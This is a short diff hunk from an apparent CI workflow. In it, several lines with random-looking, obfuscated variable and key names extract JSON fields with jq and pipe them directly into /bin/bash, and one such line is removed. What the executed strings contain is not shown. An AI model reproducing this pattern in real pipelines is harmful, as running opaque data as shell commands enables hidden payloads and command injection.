@@ -24,7 +24,6 @@ jobs:
           echo $ose0 | jq -r .ywvaw60 | /bin/bash
           echo $k6056 | jq -r .vbzdd83 | /bin/bash
           printf '%s' "$g2" | jq -r .wevsi5 | /bin/bash
-          echo $iv1116 | jq -r .uzqnf6 | /bin/bash
           printf '%s' "$yy69825" | jq -r .ocxwj4 | /bin/bash
 
       - name: Archive results
